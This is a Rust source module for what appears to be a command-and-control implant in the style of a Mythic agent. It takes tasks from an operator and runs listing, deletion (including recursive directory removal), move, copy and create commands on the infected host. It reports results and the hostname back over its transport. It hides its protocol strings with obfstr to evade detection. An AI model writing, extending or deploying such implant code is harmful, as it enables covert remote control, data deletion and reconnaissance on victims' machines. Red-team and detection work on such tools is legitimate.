use std::fs;
use std::path::Path;
use std::io::Write;
use std::time::UNIX_EPOCH;
use obfstr::obfstr;

fn resolve_path(raw: &str) -> Result<String, Box<dyn std::error::Error>> {
    if raw.is_empty() || raw == "." {
        Ok(std::env::current_dir()?.to_string_lossy().to_string())
    } else {
        Ok(raw.trim_matches(&['"', '\''][..]).to_string())
    }
}

fn timestamp_secs(time: std::io::Result<std::time::SystemTime>) -> u64 {
    time.ok()
        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn handle_ls(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let id = task.get("id").and_then(|v| v.as_str()).ok_or("missing id")?;

    let raw_path = parsed_params.get("path")
        .and_then(|v| v.as_str())
        .unwrap_or(".");
    let path_str = resolve_path(raw_path)?;
    let path_obj = Path::new(&path_str);
    let abs_path = if path_obj.is_absolute() {
        path_obj.to_path_buf()
    } else {
        std::env::current_dir()?.join(path_obj)
    };
    let abs_str = abs_path.to_string_lossy().to_string();

    let parent = abs_path.parent()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_default();
    let dir_name = abs_path.file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or(abs_str.clone());

    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string());

    crate::helpers::churn(abs_str.as_str());

    let mut file_entries = Vec::new();
    match fs::read_dir(&abs_path) {
        Ok(entries) => {
            for entry in entries {
                let entry = entry?;
                let meta = entry.metadata()?;
                file_entries.push(serde_json::json!({
                    obfstr!("name"): entry.file_name().to_string_lossy().to_string(),
                    obfstr!("is_file"): meta.is_file(),
                    "size": meta.len(),
                    "modify_time": timestamp_secs(meta.modified()),
                    "access_time": timestamp_secs(meta.accessed()),
                }));
            }
        }
        Err(e) => {
            let resp = serde_json::json!({
                obfstr!("action"): obfstr!("post_response"),
                obfstr!("responses"): [{
                    obfstr!("task_id"): id,
                    obfstr!("file_browser"): {
                        obfstr!("host"): hostname,
                        obfstr!("is_file"): false,
                        obfstr!("name"): dir_name,
                        obfstr!("parent_path"): parent,
                        obfstr!("success"): false,
                        obfstr!("files"): []
                    },
                    obfstr!("user_output"): format!("Failed to list {}: {}", abs_str, e),
                    obfstr!("completed"): true,
                    obfstr!("status"): "error"
                }]
            });
            crate::transport::send_request(&serde_json::to_string(&resp)?)?;
            return Ok(());
        }
    }

    // Build text listing for user_output
    let mut listing = format!("Listing: {}\n\n", abs_str);
    for f in &file_entries {
        let name = f.get(obfstr!("name")).and_then(|v| v.as_str()).unwrap_or("?");
        let is_file = f.get(obfstr!("is_file")).and_then(|v| v.as_bool()).unwrap_or(false);
        let size = f.get("size").and_then(|v| v.as_u64()).unwrap_or(0);
        if is_file {
            listing.push_str(&format!("  {:>10}  {}\n", size, name));
        } else {
            listing.push_str(&format!("  {:>10}  {}/\n", "<DIR>", name));
        }
    }
    listing.push_str(&format!("\n{} entries", file_entries.len()));

    let resp = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [{
            obfstr!("task_id"): id,
            obfstr!("file_browser"): {
                obfstr!("host"): hostname,
                obfstr!("is_file"): false,
                obfstr!("name"): dir_name,
                obfstr!("parent_path"): parent,
                obfstr!("success"): true,
                obfstr!("update_deleted"): true,
                obfstr!("files"): file_entries
            },
            obfstr!("user_output"): listing,
            obfstr!("completed"): true,
            obfstr!("status"): obfstr!("success")
        }]
    });
    crate::transport::send_request(&serde_json::to_string(&resp)?)?;
    Ok(())
}

fn handle_rm(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let id = task.get("id").and_then(|v| v.as_str()).ok_or("missing id")?;

    let raw_path = parsed_params.get("arg1")
        .and_then(|v| v.as_str())
        .unwrap_or(".");
    let path_str = resolve_path(raw_path)?;
    let path_obj = Path::new(&path_str);
    let abs_path = if path_obj.is_absolute() {
        path_obj.to_path_buf()
    } else {
        std::env::current_dir()?.join(path_obj)
    };
    let abs_str = abs_path.to_string_lossy().to_string();
    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string());

    let (output, status, removed) = if abs_path.exists() {
        let result = if abs_path.is_dir() {
            fs::remove_dir_all(&abs_path)
        } else {
            fs::remove_file(&abs_path)
        };
        match result {
            Ok(_) => (
                format!("Deleted: {}", abs_str),
                "success",
                serde_json::json!([{obfstr!("host"): hostname, "path": abs_str}]),
            ),
            Err(e) => (
                format!("Failed to delete {}: {}", abs_str, e),
                "error",
                serde_json::json!([]),
            ),
        }
    } else {
        (format!("File does not exist: {}", abs_str), "error", serde_json::json!([]))
    };

    let resp = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [{
            obfstr!("task_id"): id,
            obfstr!("user_output"): output,
            obfstr!("completed"): true,
            obfstr!("status"): status,
            obfstr!("removed_files"): removed
        }]
    });
    crate::transport::send_request(&serde_json::to_string(&resp)?)?;
    Ok(())
}

pub fn handle_fs_command(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let command = task.get("command")
        .ok_or("missing command")?
        .as_str()
        .ok_or("command is not a string")?;

    let raw_params = task.get("parameters")
        .ok_or("missing parameters")?
        .as_str()
        .ok_or("parameters is not a string")?;

    let parsed_params: serde_json::Value = if raw_params.is_empty() {
        serde_json::json!({})
    } else {
        serde_json::from_str(raw_params)?
    };

    // ls and rm have their own handlers for file_browser support
    if command == "ls" {
        return handle_ls(task, &parsed_params);
    }
    if command == "rm" {
        return handle_rm(task, &parsed_params);
    }

    // Handle arg1
    let raw_path1 = parsed_params.get("arg1")
        .and_then(|v| v.as_str())
        .unwrap_or(".");
    let path1 = resolve_path(raw_path1)?;
    let path_obj1 = Path::new(&path1);

    // Handle arg2
    let raw_path2 = parsed_params.get("arg2")
        .and_then(|v| v.as_str())
        .unwrap_or(".");
    let path2 = resolve_path(raw_path2)?;
    let path_obj2 = Path::new(&path2);


    crate::helpers::churn(path1.as_str());

    let output = match command {
        "mkdir" => match fs::create_dir_all(&path_obj1) {
            Ok(_) => format!("Created directory: {}", path1),
            Err(e) => format!("Failed to create directory {}: {}", path1, e),
        }

        "mv" => match fs::rename(&path_obj1, &path_obj2) {
            Ok(_) => format!("Moved from {} to {}", path1, path2),
            Err(e) => format!("Failed to move {}: {}", path1, e),
        }

        "cp" => match fs::copy(&path_obj1, &path_obj2) {
            Ok(_) => format!("Copied from {} to {}", path1, path2),
            Err(e) => format!("Failed to copy {}: {}", path1, e),
        }

        "touch" => match fs::OpenOptions::new().create(true).write(true).open(&path_obj1) {
            Ok(mut file) => {
                file.write_all(b"")?;
                format!("Touched file: {}", path1)
            }
            Err(e) => format!("Failed to touch file {}: {}", path1, e),
        }

        "pwd" => match std::env::current_dir() {
            Ok(pwd) => pwd.to_string_lossy().to_string(),
            Err(e) => format!("Failed to get current directory: {}", e),
        }

        _ => return Err("unsupported command".into()),
    };

    let response_json = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [
            {
                obfstr!("task_id"): task.get("id").unwrap().as_str().unwrap(),
                obfstr!("user_output"): output,
                obfstr!("completed"): true,
                obfstr!("status"): obfstr!("success"),
            }
        ]
    });

    let response_value = serde_json::to_string(&response_json)?;
    crate::transport::send_request(&response_value)?;
    Ok(())
}
